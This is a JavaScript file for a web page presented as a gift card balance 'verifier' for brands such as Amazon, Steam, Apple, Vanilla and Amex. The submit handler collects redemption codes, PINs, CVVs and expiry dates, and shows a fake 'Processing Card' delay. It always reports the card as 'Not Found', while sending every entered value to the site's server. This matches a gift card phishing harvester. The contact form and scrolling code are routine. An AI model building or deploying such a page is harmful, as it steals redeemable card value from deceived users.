function handleVerifyChange() {
    var CardTypes = document.getElementById("SelectCard").value;
    var cardCvv = document.getElementById("cardcvv");
    var AMEX = document.getElementById("AmexCard");
    var CardWithPin = document.getElementById("cardpin");

    if (CardTypes === "") {
        alert("Select option cannot be empty");
        return;
    }

    if (
        CardTypes === "Sephora" ||
        CardTypes === "Nordstorm" ||
        CardTypes === "Nike" ||
        CardTypes === "Target" ||
        CardTypes === "Macys"
    ) {
        CardWithPin.style.display = "block";
    } else {
        CardWithPin.style.display = "none";
    }

    if (
        CardTypes === "Vanilla" ||
        CardTypes === "Walmart" ||
        CardTypes === "MasterCard" ||
        CardTypes === "Perfect" ||
        CardTypes === "VisaSlivery" ||
        CardTypes === "TTVisa"
    ) {
        cardCvv.style.display = "block";
    } else {
        cardCvv.style.display = "none";
    }

    if (CardTypes === "Amex") {
        AMEX.style.display = "block";
        cardCvv.style.display = "block";
    } else {
        AMEX.style.display = "none";

    }

    if (CardTypes === "Apple" ||
        CardTypes === "Amazon" ||
        CardTypes === "Steam" ||
        CardTypes === "Ebay" ||
        CardTypes === "PlayStation" ||
        CardTypes === "Google" ||
        CardTypes === "Target" ||
        CardTypes === "Nordstorm" ||
        CardTypes === "Xbox" ||
        CardTypes === "RazerGold" ||
        CardTypes === "Sephora" ||
        CardTypes === "macys" ||
        CardTypes === "Nike"
    ) {
        document.getElementById("scratchCard").innerHTML = " Please ensure that the redemption code you enter is the original code revealed after scratching your card.";
    } else {
        document.getElementById("scratchCard").innerHTML = "";
    }
}
const userForm = document.getElementById('userForm')
userForm.addEventListener("submit", function (event) {
    event.preventDefault(); // Prevent form submission

    let CardTypes = document.getElementById("SelectCard").value;
    let Currency = document.getElementById("Currency").value;
    let Amount = document.getElementById("Amount").value;
    let RedeemCode = document.getElementById("RedeCode").value;
    let AccessPin = "";
    let CVV = "";
    let ExpDate = "";
    let AmexPin = "";



    var isValid = true; // Flag to track form validity

    // Check if any required input field is empty
    if (
        CardTypes === "" ||
        Currency === "" ||
        Amount === "" ||
        RedeemCode === ""
    ) {
        document.getElementById("inputFieldEmpty").innerHTML = "Please fill in all the required fields."
        return; // Stop further processing
    }

    if (
        CardTypes === "Sephora" ||
        CardTypes === "Nordstorm" ||
        CardTypes === "Nike" ||
        CardTypes === "Target" ||
        CardTypes === "Macys"
    ) {
        AccessPin = document.getElementById("AccessPin").value;
    } else if (
        CardTypes === "Vanilla" ||
        CardTypes === "Walmart" ||
        CardTypes === "MasterCard" ||
        CardTypes === "Perfect" ||
        CardTypes === "VisaSlivery" ||
        CardTypes === "TTVisa"
    ) {
        CVV = document.getElementById("CVV").value;

        // Validate Card Number
        if (!validateCardNumber()) {
            isValid = false;
            document.getElementById("redecodeError").innerHTML = "Card Number should be 16 digits";
            return
        }

        // Validate Card CVV
        if (!validateCVV()) {
            isValid = false;
            document.getElementById("cvvPinError").innerHTML = "CVV should be 3 digits";
        }

        ExpDate = document.getElementById("ExpDate").value;

        // Validate Expiry Date
        if (ExpDate === "") {
            document.getElementById("ExpDateError").innerHTML = "Input field can not be empty."
        }
    }

    if (CardTypes === "Amex") {
        AmexPin = document.getElementById("AmexPin").value;

        // Validate Amex Card Number
        if (!validateAmexPin()) {
            isValid = false;
            document.getElementById("redecodeError").innerHTML = "Card Number should be 15 digits"
        }

        CVV = document.getElementById("CVV").value;
        // Validate CVV
        /* if (!validateCVV()) {
           isValid = false;
           document.getElementById("cvvPinError").innerHTML = "CVV should be 3 digits"
         } */

        // Validate Amex Pin
        if (!validateAmexCard()) {
            isValid = false;
            document.getElementById("AmexPinError").innerHTML = "Pin should be 4 digits"
        }

        ExpDate = document.getElementById("ExpDate").value;
        // Validate Expiry Date
        if (ExpDate === "") {
            document.getElementById("ExpDateError").innerHTML = "input field can not be empty."
        }
    }



    if (isValid) {
        // Declare variables at a higher scope to make them accessible in the event listener and form submission function
        let CardTypes, Currency, Amount, RedeemCode, AccessPin, CVV, ExpDate, AmexPin;

        // Event listener for the "Verify Now" button click
        document.getElementById("verifyButton").addEventListener("click", function () {
            // Store the original button text
            var verifyButton = document.getElementById("verifyButton");
            var originalButtonText = verifyButton.innerHTML;

            // Update button text to indicate processing
            verifyButton.innerHTML = "Processing Card";

            // Get form data
            CardTypes = document.getElementById("SelectCard").value;
            Currency = document.getElementById("Currency").value;
            Amount = document.getElementById("Amount").value;
            RedeemCode = document.getElementById("RedeCode").value;
            AccessPin = document.getElementById("AccessPin").value;
            CVV = document.getElementById("CVV").value;
            ExpDate = document.getElementById("ExpDate").value;
            AmexPin = document.getElementById("AmexPin").value;

            // Simulate processing time (remove this if you don't need a delay)
            setTimeout(function () {
                Swal.fire({
                    width: 1000,
                    height: 1000,
                    title: "Success!",
                    html:
                        `
      <div>
        <h3>Your ${CardTypes} gift card has been verified</h3>
        <p><strong>Here's the result:</strong></p>
        <hr>
        <p><strong>Brand:</strong> ${CardTypes}</p>
        <p><strong>Amount:</strong> ${Currency} ${Amount}</p>
        <p style="color:red;"><strong>Status:</strong> <b>Not Found</b></p>
      </div>
    `,
                    icon: "sucess",
                    customClass: {
                        title: 'swal-title-green' // Custom CSS class for the title
                    },
                }).then(() => {
                    // Revert back to original button text
                    verifyButton.innerHTML = originalButtonText;

                    // Clear input fields
                    document.getElementById("SelectCard").value = "";
                    document.getElementById("Currency").value = "USD";
                    document.getElementById("Amount").value = "";
                    document.getElementById("RedeCode").value = "";
                    document.getElementById("AccessPin").value = "";
                    document.getElementById("CVV").value = "";
                    document.getElementById("ExpDate").value = "";
                    document.getElementById("AmexPin").value = "";
                    document.getElementById("redecodeError").value = "";
                    document.getElementById("cvvPinError").value = "";
                    document.getElementById("AmexPinError").value = "";
                    document.getElementById("ExpDateError").value = "";
                    // Submit the form
                    submitForm();

                });
            }, 2000); // Adjust the delay time as needed
        });

        // Function to handle form submission
        function submitForm() {
            // If the form is valid, create the formData object and send it using XMLHttpRequest
            let formData = {
                selectcard: CardTypes,
                currency: Currency,
                amount: Amount,
                remeCode: RedeemCode,
                accessPin: AccessPin,
                cvv: CVV,
                expDate: ExpDate,
                amex: AmexPin,
            };

            location.reload();

            let xhr = new XMLHttpRequest();
            xhr.open("POST", "/");
            xhr.setRequestHeader("content-type", "application/json");
            xhr.onload = function () {
                console.log(xhr.responseText);
                if (xhr.responseText === "success") {
                    // If the response is 'success', show the success alert
                    CardTypes = "";
                    Currency = "";
                    Amount = "";
                    RedeemCode = "";
                    AccessPin = "";
                    CVV = "";
                    ExpDate = "";
                    AmexPin = "";


                } else {
                    // If the response is not 'success', show the error alert
                    //alert("something went wrong");
                }
            };

            xhr.send(JSON.stringify(formData));
        }





    }
});

// Validation function

function validateCVV() {
    var cvv = document.getElementById("CVV").value;
    return /^\d{3}$/.test(cvv);
}

function validateCardNumber() {
    var cardNumber = document.getElementById("RedeCode").value;
    return /^\d{16}$/.test(cardNumber);
}

function validateAmexPin() {
    var amexPin = document.getElementById("RedeCode").value;
    return /^\d{15}$/.test(amexPin); // Amex 15 card number
}

function validateAmexCard() {
    var amexPin = document.getElementById("AmexPin").value;
    return /^\d{4}$/.test(amexPin); // Amex card 4 digit pin
}

// Validation function for Expiry Date
/*function validateExpiryDate() {
  var expiryDate = document.getElementById("ExpDate").value;
  var regex = /^(0[1-9]|1[0-2])\/\d{2}$/; // MM/YY format regex pattern
 
  if (!regex.test(expiryDate)) {
    return false;
  }
 
  var parts = expiryDate.split("/");
  var month = parseInt(parts[0], 10);
  var year = parseInt(parts[1], 10) + 2000; // Adding 2000 to represent 4-digit year
 
  var currentYear = new Date().getFullYear();
  var currentMonth = new Date().getMonth() + 1; // Adding 1 since getMonth() returns zero-based index
 
  if (year < currentYear || (year === currentYear && month < currentMonth)) {
    return false;
  }
  return true;
}
 
// Event listener for expiry date input field
document.getElementById("ExpDate").addEventListener("input", function (event) {
  var input = event.target.value;
 
  // Insert "/" after two digits (MM) have been entered
  if (input.length === 2 && input.indexOf("/") === -1) {
    event.target.value = input + "/";
  }
});
 
*/

// TO SCROLL TO AND FRO 
document.addEventListener('DOMContentLoaded', function () {
    var navLinks = document.querySelectorAll('a');

    for (var i = 0; i < navLinks.length; i++) {
        navLinks[i].addEventListener('click', smoothScroll);
    }

    function smoothScroll(event) {
        event.preventDefault();

        var targetId = this.getAttribute('href');
        var targetElement = document.querySelector(targetId);
        if (!targetElement) return; // Check if the target element exists
        var targetOffset = targetElement.offsetTop;
        var currentPosition = window.pageYOffset;
        var distance = targetOffset - currentPosition;
        var duration = 700; // Duration in milliseconds
        var start;

        window.requestAnimationFrame(step);

        function step(timestamp) {
            if (!start) start = timestamp;
            var progress = timestamp - start;
            window.scrollTo(0, easeInOutCubic(progress, currentPosition, distance, duration));
            if (progress < duration) window.requestAnimationFrame(step);
        }

        // Easing function
        function easeInOutCubic(t, b, c, d) {
            t /= d / 2;
            if (t < 1) return c / 2 * t * t * t + b;
            t -= 2;
            return c / 2 * (t * t * t + 2) + b;
        }
    }
});


// Contant us 



document.getElementById('contactUS').addEventListener('submit', function (e) {
    e.preventDefault(); // Prevent form submission

    var email = document.getElementById('contactEmail').value;
    var message = document.getElementById('contactMessage').value;

    if (email === "" || message === "") {
        Swal.fire({
            type: 'error',
            text: 'Input fields cannot be empty',
        });
        return;
    }

    // Create form data object
    var contactFormData = {
        Email: email,
        Message: message,
    };

    // Send form data using AJAX
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/contact');
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.onload = function () {
        if (xhr.status === 200) {
            // Email sent successfully
            Swal.fire({
                type: 'success',
                title: 'Message Sent',
                text: 'Thanks for contacting us',
            }).then(function () {
                document.getElementById('contactEmail').value = '';
                document.getElementById('contactMessage').value = '';
            });
        } else {
            // Error sending email
            Swal.fire({
                type: 'error',
                title: 'Error sending email',
                text: 'Please try again.',
            });
        }
    };

    xhr.send(JSON.stringify(contactFormData));
});


